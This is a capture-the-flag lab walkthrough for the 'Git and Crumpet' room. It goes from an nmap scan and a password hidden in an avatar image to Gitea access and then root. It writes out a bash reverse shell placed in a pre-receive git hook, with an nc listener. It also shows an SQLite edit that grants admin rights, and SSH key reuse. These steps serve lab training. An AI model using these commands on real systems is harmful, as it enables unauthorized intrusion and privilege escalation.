Git and Crumpet
============

Initial nmap scan

```bash
Nmap scan report for 10.10.227.80 (10.10.227.80)  
Host is up, received user-set (0.15s latency).  
Scanned at 2021-07-03 13:11:52 +0530 for 54s  
Not shown: 997 filtered ports  
Reason: 986 no-responses and 11 host-unreaches  
PORT     STATE  SERVICE    REASON       VERSION  
22/tcp   open   ssh        syn-ack      OpenSSH 8.0 (protocol 2.0)  
80/tcp   open   http       syn-ack      nginx  
9090/tcp closed zeus-admin conn-refused
```


## User Flag

When we visit website it redirect to youtube, so try to `curl` webpage for any hidden details.

```html
(...)
<h1>Nothing to see here, move along</h1>  
     <h2>Notice:</h2>  
     <p>    
       Hey guys,  
          I set up the dev repos at git.git-and-crumpets.thm, but I haven't gotten around to setting up the DNS yet.    
          In the meantime, here's a fun video I found!  
       Hydra  
     </p>
(...)
```

Look like another site virtually hosted, add **git-and-crumpets.thm** and **git.git-and-crumpets.thm** to `/etc/hosts` file and visit **git.git-and-crumpets.thm**.

![](/Images/git_and_crumpet/git.png)

we come to this page but cannot do without accout so register account with any preffered name.

when we go thought site we find old commit file with hint for password here `http://git.git-and-crumpets.thm/scones/cant-touch-this/commits/branch/master`

![](/Images/git_and_crumpet/hint1.png)

can find avatar image in here `http://git.git-and-crumpets.thm/avatars/3fc2cde6ac97e8c8a0c8b202e527d56d`

use **curl** and **strings** to only useful strings.

`curl -s http://git.git-and-crumpets.thm/avatars/3fc2cde6ac97e8c8a0c8b202e527d56d | strings -n 8`

```
8tEXtDescription  
My 'Password' should be easy enough to guess  
E7V:W*555}  
&<A3Pr;5s  
L)';m}E)  
\IQG=;'1  
b9UfqEi 1
```

we have password you can also find email with many ways easiest is from profile.
`http://git.git-and-crumpets.thm/scones`

login using **email** and **password**.

![](/Images/git_and_crumpet/scones.png)

After loging goto `cant-touch-this` repository, under `settings` select `Git Hooks` and edit `pre-receive` and bash reverse shell.

full url link : `http://git.git-and-crumpets.thm/scones/cant-touch-this/settings/hooks/git`

```bash
add this line in pre-recevie "/bin/sh -i >& /dev/tcp/$IP/9999 0>&1"

start nc listner "nc -lvnp 9999"

goto Repository edit "README.md" add some random word and save
```


![](/Images/git_and_crumpet/shell.png)


then we need to stabilize the shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   
  
  
export TERM=xterm  
  Press "CTRL + Z" then enter last command
  
stty raw -echo; fg


stty rows 31  # depend on your terminal size use "stty -a" see the size

stty cols 124 # depend on your terminal size use "stty -a" see the size

```

## Root Flag

In path `/var/lib/gitea/data` you will find `gitea.db` database file for git server, if we tinker with it we might find something to get root flag.

```bash
sqlite> .tables  

access                     org_user                    
access_token               project                     
action                     project_board               
attachment                 project_issue               
collaboration              protected_branch            
comment                    public_key                  
commit_status              pull_request                
deleted_branch             reaction                    
deploy_key                 release                     
email_address              repo_indexer_status         
email_hash                 repo_redirect               
external_login_user        repo_topic                  
follow                     repo_transfer               
gpg_key                    repo_unit                   
gpg_key_import             repository                  
hook_task                  review                      
issue                      session                     
issue_assignees            star                        
issue_dependency           stopwatch                   
issue_label                task                        
issue_user                 team                        
issue_watch                team_repo                   
label                      team_unit                   
language_stat              team_user                   
lfs_lock                   topic                       
lfs_meta_object            tracked_time                
login_source               two_factor                  
milestone                  u2f_registration            
mirror                     upload                      
notice                     user                        
notification               user_open_id                
oauth2_application         user_redirect               
oauth2_authorization_code  version                     
oauth2_grant               watch                       
oauth2_session             webhook                     

sqlite> .schema user  

CREATE TABLE `user` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `lower_name` TEXT NOT NULL, `name` TEXT NOT NULL, `ful  
l_name` TEXT NULL, `email` TEXT NOT NULL, `keep_email_private` INTEGER NULL, `email_notifications_preference` TEXT DEFAULT '  
enabled' NOT NULL, `passwd` TEXT NOT NULL, `passwd_hash_algo` TEXT DEFAULT 'argon2' NOT NULL, `must_change_password` INTEGER  
DEFAULT 0 NOT NULL, `login_type` INTEGER NULL, `login_source` INTEGER DEFAULT 0 NOT NULL, `login_name` TEXT NULL, `type` IN  
TEGER NULL, `location` TEXT NULL, `website` TEXT NULL, `rands` TEXT NULL, `salt` TEXT NULL, `language` TEXT NULL, `descripti  
on` TEXT NULL, `created_unix` INTEGER NULL, `updated_unix` INTEGER NULL, `last_login_unix` INTEGER NULL, `last_repo_visibili  
ty` INTEGER NULL, `max_repo_creation` INTEGER DEFAULT -1 NOT NULL, `is_active` INTEGER NULL, `is_admin` INTEGER NULL, `is_re  
stricted` INTEGER DEFAULT 0 NOT NULL, `allow_git_hook` INTEGER NULL, `allow_import_local` INTEGER NULL, `allow_create_organi  
zation` INTEGER DEFAULT 1 NULL, `prohibit_login` INTEGER DEFAULT 0 NOT NULL, `avatar` TEXT NOT NULL, `avatar_email` TEXT NOT  
NULL, `use_custom_avatar` INTEGER NULL, `num_followers` INTEGER NULL, `num_following` INTEGER DEFAULT 0 NOT NULL, `num_star  
s` INTEGER NULL, `num_repos` INTEGER NULL, `num_teams` INTEGER NULL, `num_members` INTEGER NULL, `visibility` INTEGER DEFAUL  
T 0 NOT NULL, `repo_admin_change_team_access` INTEGER DEFAULT 0 NOT NULL, `diff_view_style` TEXT DEFAULT '' NOT NULL, `theme  
` TEXT DEFAULT '' NOT NULL, `keep_activity_private` INTEGER DEFAULT 0 NOT NULL);  
CREATE UNIQUE INDEX `UQE_user_name` ON `user` (`name`);  
CREATE UNIQUE INDEX `UQE_user_lower_name` ON `user` (`lower_name`);  
CREATE INDEX `IDX_user_created_unix` ON `user` (`created_unix`);  
CREATE INDEX `IDX_user_updated_unix` ON `user` (`updated_unix`);  
CREATE INDEX `IDX_user_last_login_unix` ON `user` (`last_login_unix`);  
CREATE INDEX `IDX_user_is_active` ON `user` (`is_active`);  

sqlite> select id,name,is_admin from user;  

1|hydra|1  
2|root|0  
3|scones|0  
4|test|0  
5|jordan|0  

sqlite> update user set is_admin=1 where id=3;  

sqlite> select id,name,is_admin from user;       

1|hydra|1  
2|root|0  
3|scones|1  
4|test|0  
5|jordan|0  
sqlite>
```

scone user have admin privilege now, lets goto git webpage and see any readable files.

In explore page we find new repository.

![](/Images/git_and_crumpet/backup.png)


We found ssh key in here. `http://git.git-and-crumpets.thm/root/backup/commit/0b23539d97978fc83b763ef8a4b3882d16e71d32` 

save the SSH key on your PC and login with it.

![](/Images/git_and_crumpet/root.png)

Happy Hacking!!!


